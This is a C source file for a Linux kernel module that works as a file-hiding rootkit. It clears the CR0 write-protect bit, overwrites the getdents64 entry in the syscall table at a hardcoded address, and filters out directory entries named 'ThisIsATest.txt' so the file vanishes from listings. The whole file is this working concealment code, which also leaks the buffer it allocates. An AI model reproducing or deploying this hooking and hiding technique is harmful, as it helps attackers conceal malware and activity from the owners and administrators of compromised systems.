#include <linux/module.h>
#include <linux/dirent.h>
#include <asm/cacheflush.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
 
int load(void);
void unload(void);

struct pt_regs_x86 {
/*
 * C ABI says these regs are callee-preserved. They aren't saved on kernel entry
 * unless syscall needs a complete, fully filled "struct pt_regs".
 */
	unsigned long r15;
	unsigned long r14;
	unsigned long r13;
	unsigned long r12;
	unsigned long rbp;
	unsigned long rbx;
/* These regs are callee-clobbered. Always saved on kernel entry. */
	unsigned long r11;
	unsigned long r10;
	unsigned long r9;
	unsigned long r8;
	unsigned long rax;
	unsigned long rcx;
	unsigned long rdx;
	unsigned long rsi;
	unsigned long rdi;
/*
 * On syscall entry, this is syscall#. On CPU exception, this is error code.
 * On hw interrupt, it's IRQ number:
 */
	unsigned long orig_rax;
/* Return frame for iretq */
	unsigned long rip;
	unsigned long cs;
	unsigned long eflags;
	unsigned long rsp;
	unsigned long ss;
/* top of stack page */
};

typedef asmlinkage int (*original_getdents64_t)(const struct pt_regs_x86 *regs);
static unsigned long *syscall_table = (unsigned long *)0xffffffff8cc001a0; 
static original_getdents64_t original_getdents64_ptr;
static char *file_name_to_hide = "ThisIsATest.txt";
 
static inline void wp_cr0(unsigned long val) {
    __asm__ __volatile__ ("mov %0, %%cr0": "+r" (val));
}

static inline void zero_cr0(void) {
    printk(KERN_ALERT "Unprotecting mem!");
    wp_cr0(read_cr0() & (~0x10000));
}

static inline void one_cr0(void) {
    printk(KERN_ALERT "Protecting mem...");
    wp_cr0(read_cr0() | 0x10000);
}

asmlinkage int new_getdents64(const struct pt_regs_x86 *regs) {
    int total_bytes_read = (int)original_getdents64_ptr(regs);
    struct linux_dirent64 *buff = (struct linux_dirent64*)((char*)regs->rsi);

    // Can be one or more, doesn't really matter so long as it's triggered.
    int has_been_found = 0;
    char *first;
    if (total_bytes_read > 0) {
        printk(KERN_ALERT "Total bytes read: %d", total_bytes_read);
        printk(KERN_ALERT "Buffer pointer: %p", buff);

        first = kmalloc(total_bytes_read, GFP_KERNEL);

        int copy_res;
        copy_res = copy_from_user((void *)first, buff, (unsigned long)total_bytes_read);
        if (copy_res) {
            printk(KERN_ALERT "Error while copying from user space! error %d", copy_res);
            return total_bytes_read;
        }

        struct linux_dirent64 * curr;
        curr = (struct linux_dirent64*)(first);

        size_t i = 0;
        while ((i < total_bytes_read) && (curr->d_reclen > 0)) {   
            curr = (struct linux_dirent64*)(first + i);

            char *name = curr->d_name;
            printk(KERN_ALERT "Original: %p. Index: %ld, Name: \"%s\" Current pointer: %p has length: %d", first, i, name, curr, curr->d_reclen);
            if (!strcmp(name, file_name_to_hide)) {
                has_been_found += 1;
                // File matches name to hide, we need to delete it from the array.
                printk(KERN_ALERT "FOUND YOU!");
                int length_to_copy = total_bytes_read - i - curr->d_reclen;
                // Array has been shortened by the length of the member we've just deleted.
                total_bytes_read -= curr->d_reclen;
                printk(KERN_ALERT "Total bytes read after delete: %d", total_bytes_read);
                
                void *next_pos = first + i + curr->d_reclen;
                memmove((void*)curr, (void*)next_pos, length_to_copy);
                continue;
            }

            i += curr->d_reclen;
        }
    }

    if (has_been_found) {
        copy_to_user(buff, (void*)first, total_bytes_read);
    }

    return total_bytes_read;
}
 
int load(void) {
    printk(KERN_ALERT "Initializing...");
    zero_cr0();
    original_getdents64_ptr = (original_getdents64_t)syscall_table[__NR_getdents64];
    printk(KERN_ALERT "%p OWP", original_getdents64_ptr);
    syscall_table[__NR_getdents64] = (unsigned long)new_getdents64;
    printk(KERN_ALERT "Overrided getdents64 ptr!");
    one_cr0();
    printk(KERN_ALERT "Initialized successfuly!");

    return 0;
}
 
void unload(void) {
    printk(KERN_ALERT "Shutting down.");
    zero_cr0();
    syscall_table[__NR_getdents64] = (unsigned long)original_getdents64_ptr;  
    one_cr0();
    printk(KERN_ALERT "Goodbye world...");
}

module_init(load);
module_exit(unload);

MODULE_LICENSE("GPL");